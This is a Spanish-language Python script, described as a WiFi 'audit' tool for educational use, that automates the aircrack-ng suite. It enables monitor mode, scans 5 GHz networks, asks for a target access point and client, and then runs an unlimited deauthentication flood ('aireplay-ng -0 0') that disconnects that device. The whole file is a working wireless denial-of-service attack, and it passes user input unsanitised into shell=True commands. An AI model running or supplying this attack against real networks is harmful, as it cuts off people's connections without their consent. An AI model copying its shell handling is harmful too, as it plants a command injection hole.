#!/usr/bin/env python3

import os
import subprocess

def ejecutar_comando(comando):
    """Ejecuta un comando en el shell con permisos de administrador."""
    try:
        subprocess.run(comando, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Error al ejecutar el comando: {comando}")

def main():
    print("=== Script de Auditoría de Redes WiFi ===")
    print("Nota: Este script es exclusivamente para fines educativos. Asegúrate de tener los permisos adecuados.")
    print("Asegúrate de ejecutarlo como administrador.\n")

    # Verificar el nombre de la tarjeta de red
    print("Verificando tarjetas de red disponibles...")
    ejecutar_comando("iwconfig")
    tarjeta_red = input("\nIntroduce el nombre de la tarjeta de red (ejemplo: wlan0): ").strip()

    # Iniciar modo monitor
    print("\nCambiando la tarjeta de red al modo monitor...")
    ejecutar_comando(f"airmon-ng start {tarjeta_red}")

    # Escanear redes disponibles
    print("\nEscaneando redes WiFi disponibles en la banda 'a'...")
    print("Presiona CTRL+C cuando encuentres la red que deseas auditar.\n")
    ejecutar_comando(f"airodump-ng --band a {tarjeta_red}")
    
    # Solicitar información de la red a auditar
    bssid = input("\nIntroduce el BSSID de la red objetivo: ").strip()
    canal = input("Introduce el canal (CH) de la red objetivo: ").strip()

    # Monitorear la red específica
    print(f"\nMonitoreando la red {bssid} en el canal {canal}...")
    print("Presiona CTRL+C cuando encuentres los dispositivos conectados.\n")
    ejecutar_comando(f"airodump-ng --band a -c {canal} --bssid {bssid} {tarjeta_red}")

    # Solicitar información del dispositivo objetivo
    station = input("\nIntroduce el STATION (dispositivo objetivo): ").strip()

    # Intentar desautenticar el dispositivo
    print(f"\nEnviando desautenticación al dispositivo {station}...")
    ejecutar_comando(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}")

    print("\nSi este no es el dispositivo deseado, reinicia el script y prueba con otro STATION.\n")

    # Detener modo monitor
    print("Deteniendo el modo monitor y restaurando configuración...")
    ejecutar_comando(f"airmon-ng stop {tarjeta_red}")

    print("\n=== Script finalizado ===")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script debe ejecutarse como administrador (sudo).")
        exit(1)
    main()
